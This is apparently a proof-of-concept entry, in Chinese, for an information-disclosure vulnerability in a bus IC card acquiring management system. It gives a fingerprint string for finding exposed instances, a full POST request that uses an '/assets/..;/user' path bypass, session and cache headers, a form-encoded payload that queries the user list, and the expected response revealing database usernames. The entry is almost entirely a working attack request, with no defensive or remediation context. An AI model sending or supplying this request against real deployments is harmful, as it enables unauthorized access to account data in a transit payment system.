# 公交IC卡收单管理系统user存在信息泄露漏洞

- **系统**：公交IC卡收单管理系统　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`app="公交IC卡收单管理系统"`
- **请求**：`POST /assets/..;/user HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=B4B300824AA8F075EAC1E702454B91BA`　`If-None-Match: W/"8977-1726725363928"`　`If-Modified-Since: Thu, 19 Sep 2024 05:56:03 GMT`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 197`

**请求体 / payload**
```
_search=false&nd=1727275150716&rowCountPerPage=10&pageNo=1&sidx=USER_NAME&sord=asc&method=select&USER_NAME=&REAL_NAME=&ACCOUNT_EXPIRE_TIME=%E5%BF%BD%E7%95%A5&PASSWORD_EXPIRE_TIME=%E5%BF%BD%E7%95%A5
```
- **预期**：200　|　db_username